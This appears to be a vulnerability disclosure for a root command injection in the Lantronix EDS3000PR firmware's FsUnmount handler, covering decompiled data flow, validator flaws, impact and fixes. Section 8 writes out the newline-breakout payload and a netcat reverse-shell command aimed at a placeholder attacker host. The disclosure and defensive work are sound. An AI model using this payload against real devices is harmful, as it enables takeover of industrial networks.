# Lantronix EDS3000PR 3.2.0.0R2 — Authenticated Command Injection in FsUnmount → Root RCE

## 1. Overview

Lantronix EDS3000PR is an 8-port industrial serial device server (CII/OT) running Linux 3.6.5 ARM with a UBIFS rootfs and firmware 3.2.0.0R2 (NUEVO-2). The web stack is nginx:80 proxying to the custom EVO C daemon `/bin/ltrx_evo` (ARM 32-bit stripped, 1.1 MB) on 127.0.0.1:8080. The `FsUnmount` page handler (`FUN_0005475c`) validates a user-supplied `path` parameter against a character bitmask, then builds `/sbin/ltrx_usb_umount '/ltrx_user<path>'` and executes it through the shell-exec family (`exec_system_cmd_print` → `mpnipc_proxy_shell_cmd` → `fork+execl("/bin/sh","sh","-c",cmd)`).

The bitmask (`DAT_00054aa0 = 0x2c000029`) rejects `;`, `$`, `&`, `!`, `>`, `<`, `|`, backtick, and backslash but **allows single quotes (0x27) and newlines (0x0a)**. A newline breaks out of the single-quoted command: `path = x'\n<cmd> #` produces two shell lines — line 1 is the harmless `ltrx_usb_umount` invocation, line 2 is the injected command, and `#` comments out the trailing quote. The injected command executes as root (the EVO daemon runs as root). Verified with a root-owned marker in a qemu-arm chroot using the real rootfs `/bin/sh`.

## 2. Vulnerability Summary

- **Type**: Authenticated OS command injection → root RCE (CWE-78)
- **Root cause 1 (CWE-78)**: `path` flows into `sprintf_malloc("/sbin/ltrx_usb_umount '%s'", "/ltrx_user" + path)` and `exec_system_cmd_print`, which runs `/bin/sh -c`
- **Root cause 2 (CWE-20)**: the character bitmask validator allows `'` (0x27) and `\n` (0x0a), enabling single-quote breakout plus newline command separation
- **Root cause 3 (CWE-250)**: `ltrx_evo` runs as root, so injected commands execute with uid 0
- **Result**: authenticated admin (filesystem write) → root RCE on the device. CVSS 8.8.

## 3. Authentication Boundary

The handler enforces session authentication at the entry (`*param_1 == 0` → "user not logged in!" error 0x2a) and requires the `filesystem` group write permission (`IsGroupListWritable(*param_1, "filesystem")` → error 0x29). The default admin password is derived from the last 8 characters of the device serial number (`CfgVarGetDefaultValue` @ 0x22e00: `DeviceSerialNumberGet` → `strncpy(serial+len-8, 8)`); there is no hard-coded backdoor. An FUE gate (three-agent surface exhaustion) confirmed that no unauthenticated path reaches this sink — the vulnerability is Target B (authenticated RCE).

## 4. Attack Surface

- **Entry**: the `FsUnmount` web page handler (page-handler table entry `{0x0005475c, "FsUnmount"}` at 0x97d08)
- **Controllable parameter**: `path` (validated by the bitmask, max length 4086, rejects `..`)
- **Trigger**: an authenticated filesystem-writable session submits the malicious path
- **Privilege**: root — the EVO daemon and the shell command run as uid 0
- **Command characters available**: letters, `/`, `.`, `-`, `(`, `)`, space, `'`, `\n`, `#` — enough for `touch`, `nc` reverse shells, and common command names

## 5. Sink Identification

Decompiled data flow (`FUN_0005475c`):

```c
__haystack_00 = FUN_000bf27c(param_1, "path");        // user path parameter
// validation: strstr(path,"..") → reject; strlen ≤ 4086; character bitmask loop
sprintf(acStack_1020, "%s%s", "/ltrx_user", path);
iVar2 = IseUSB(path);
if (iVar2 == 0) {                                     // path is not the Lantronix_eUSB mount → nearly any path
    uVar7 = sprintf_malloc("/sbin/ltrx_usb_umount '%s'", acStack_1020);
    exec_system_cmd_print(uVar7, 0, 0);               // ★ /bin/sh -c
}
```

The bitmask `DAT_00054aa0 = 0x2c000029` allows `'` (shift 6) and `\n` (out-of-range → allowed), and `#` (shift 2). The shell-exec family (`exec_system_cmd_ex` @ 0x9b844, `exec_system_cmd_print` @ 0x9b740, `exec_system_vcmd` @ 0x9b99c) all reach `mpnipc_proxy_shell_cmd`, which IPC-sends to `ltrx_cmdproxy`, which runs `fork()+execl("/bin/sh","sh","-c",cmd,NULL)` — canonical shell semantics (confirmed by the presence of `|`, `tail`, `grep` pipelines in the firmware).

## 6. Source Identification & Controllability

The source is the `path` HTTP parameter. The validator's bitmask is the only gate, and it explicitly permits the two characters needed for the exploit (`'` and `\n`) while rejecting the more common `;`, `$`, `>`, `<`, `&`, `|`, backtick, and backslash. The `IseUSB(path)==0` gate is satisfied by nearly every path (anything that is not the Lantronix_eUSB mount), including the malicious payload. The attacker therefore controls both the breakout and the injected command (subject to the allowed-character set).

The bitmask value `0x2c000029` is interpreted as a reject-set: for each byte of the path, the handler tests the bit at `byte & 0x1f`; a set bit rejects the character, an unset bit (or an out-of-range shift, as with `\n` = 0x0a) allows it. Shift 6 (bit 6, `0x40`) corresponds to `'` (0x27) and is not set — the single quote that wraps the path in the umount template therefore survives validation. Shift 2 (bit 2, `0x04`) corresponds to `#` (0x23) and is also not set, which lets the payload comment out the trailing quote after the newline-separated command. This combination — quote, newline, and comment characters all allowed — is precisely the minimal set needed for a reliable shell breakout, and its presence in an allowlist-style validator is the core defect.

The command-construction order also matters: `sprintf` first prefixes `/ltrx_user`, so the attacker's path appears after the prefix; the newline terminates the first command line, and everything after the newline is a fresh shell line that inherits the same root privilege. Because `exec_system_cmd_print` passes the buffer straight to the proxy shell (`/bin/sh -c`) without a separate argument boundary, there is no escaping layer between the constructed string and the shell parser.

## 7. Data Flow

1. Authenticated admin POSTs to the FsUnmount page with `path = x'\n<cmd> #`
2. `FUN_000bf27c` extracts the `path` parameter
3. The validator passes (no `..`, length ≤ 4086, bitmask allows `'` and `\n`)
4. `sprintf` builds `/ltrx_user` + path
5. `sprintf_malloc` builds `/sbin/ltrx_usb_umount '/ltrx_userx'` + `<LF>` + `<cmd> #'`
6. `exec_system_cmd_print` → `mpnipc_proxy_shell_cmd` → `ltrx_cmdproxy` → `/bin/sh -c` (root)
7. Line 1: `ltrx_usb_umount` fails harmlessly; line 2: injected command executes; `#` comments the trailing quote

## 8. Exploit Construction

Payload:

```
path = x'\n<cmd> #
```

Expanded command:

```sh
/sbin/ltrx_usb_umount '/ltrx_userx'
<cmd> #'
```

- Line 1: `ltrx_usb_umount '/ltrx_userx'` — harmless failure
- Line 2: `<cmd>` — the injected command executes as root
- `#` comments out the trailing `'` from the template

Because `;`, `$`, `>`, `<`, `&`, `|`, backtick and backslash are rejected, the injected command must use allowed characters only — e.g. `touch /tmp/marker` or a reverse shell `nc <attacker> <port> -e /bin/sh`.

## 9. Dynamic Verification

The sink was verified by reproducing the exact command generation (`sprintf`) plus the exact shell execution (`/bin/sh -c`) inside a qemu-arm chroot with the real rootfs `/bin/sh`:

- Payload `path = x'\ntouch /tmp/rce_marker_eds3000pr #` passed the validator (reachable → exec) ✓
- Negative controls with `;`, `$`, `|`, `&`, `>` were all rejected by the validator ✓
- Result: marker created with `uid=0 gid=0` (root), exit 0; line 1 `ltrx_usb_umount` failed harmlessly while line 2 executed ✓

Full end-to-end HTTP testing was not possible (the EVO daemon needs NVRAM/encrypted factory.xcr/ZMQ IPC stack and port 8080 was occupied in the research environment); dynamic verification focused on the sink (command generation + shell execution). HTTP `%0a` URL decoding is standard framework behavior (confirmed statically in `FUN_000bf27c`).

## 10. Reachability & Impact

- **Reachability**: requires an authenticated admin session with filesystem write permission — a standard admin on the device. No unauthenticated path reaches the sink (confirmed by a three-agent surface-exhaustion gate).
- **Impact**: root command execution on the industrial serial device server — the gateway between serial devices (PLCs, industrial controllers) and the IP network. Full device takeover, interception or manipulation of serial traffic, and a foothold inside the OT network.
- **Scope**: EDS3000PR firmware 3.2.0.0R2 and other NUEVO-2 builds sharing the FsUnmount handler.

## 11. Fix Recommendations

1. Add `'` (0x27) and `\n` (0x0a) to the rejected-character bitmask in the path validator
2. Replace shell execution with parameter-array `execv` for `ltrx_usb_umount` (no shell parsing)
3. Fix the `IseUSB` `grep 'on %s type'` sink for the same injection class
4. Run the EVO daemon with least privilege where the architecture allows

## 12. CWE & CVSS

- **CWE-78**: Improper Neutralization of Special Elements used in an OS Command — `system()` with unsanitized path
- **CWE-20**: Improper Input Validation — bitmask misses `'` and `\n`
- **CWE-250**: Execution with Unnecessary Privileges — daemon runs as root
- **CVSS**: 8.8 High — CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
